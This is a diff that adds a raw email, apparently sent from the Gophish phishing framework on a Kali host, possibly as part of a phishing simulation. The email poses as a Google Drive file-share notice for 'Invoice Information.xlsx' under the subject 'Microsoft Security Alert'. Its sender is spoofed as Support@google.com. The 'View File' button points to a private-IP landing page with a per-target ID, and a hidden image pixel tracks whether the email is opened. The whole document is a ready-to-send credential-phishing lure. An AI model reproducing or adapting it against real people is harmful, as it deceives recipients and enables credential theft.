@@ -1,0 +1,95 @@
+Mime-Version: 1.0
+Date: Tue, 28 Jul 2026 11:05:12 -0400
+X-Mailer: gophish
+Message-Id: <1785251112660790926.11634.6576417821464558106@kali>
+Subject: Microsoft Security Alert
+To: "phg nguyen" <phgnguyenxyz@gmail.com>
+From: Support@google.com
+Content-Type: text/html; charset=UTF-8
+Content-Transfer-Encoding: quoted-printable
+
+<!DOCTYPE html>
+<html>
+<head>
+	<title></title>
+	<meta charset=3D"UTF-8"/>
+	<style type=3D"text/css">body {
+            font-family: 'Helvetica Neue', Arial, sans-serif;
+            color: #333;
+            line-height: 1.6;
+            margin: 0;
+            padding: 0;
+            background-color: #f1f1f1;
+        }
+        .container {
+            max-width: 600px;
+            margin: 40px auto;
+            background: #ffffff;
+            padding: 20px;
+            border-radius: 12px;
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.1);
+            border: 1px solid #e1e1e1;
+        }
+        h1 {
+            font-size: 24px;
+            color: #444;
+            margin-bottom: 20px;
+            font-weight: 700;
+        }
+        p {
+            margin: 0 0 20px;
+            color: #555;
+        }
+        .link-button {
+            display: inline-flex;
+            align-items: center;
+            padding: 12px 24px;
+            font-size: 16px;
+            color: #ffffff;
+            background-color: #007bff;
+            text-decoration: none;
+            border-radius: 6px;
+            transition: background-color 0.3s ease, transform 0.3s ease;
+            border: none;
+            cursor: pointer;
+        }
+        .link-button:hover {
+            background-color: #0056b3;
+            transform: scale(1.02);
+        }
+        .icon {
+            width: 20px;
+            height: 20px;
+            margin-right: 8px;
+        }
+        .footer {
+            font-size: 14px;
+            color: #777;
+            margin-top: 20px;
+            text-align: center;
+        }
+	</style>
+</head>
+<body>
+<div class=3D"container">
+<h1>File &quot;Invoice Information.xlsx&quot; Shared with You</h1>
+
+<p>Hello Phg Nguyen,</p>
+
+<p>A file has been shared with you via Google Drive. Click the button below=
+ to view it:</p>
+
+<p><a _blank=3D"" href=3D"http://172.16.1.134?rid=3Drxh7JV7"><img alt=3D"Go=
+ogle Drive Icon" class=3D"icon" src=3D"https://www.google.com/images/icons/=
+product/drive-32.png" /> View File </a></p>
+
+<p>If you have any issues accessing the file, please contact us.</p>
+
+<div class=3D"footer">
+<p>Best regards,<br />
+GOOGLE SUPPORT</p>
+</div>
+</div>
+<img alt=3D'' style=3D'display: none' src=3D'http://172.16.1.134/track?rid=
+=3Drxh7JV7'/></body>
+</html>
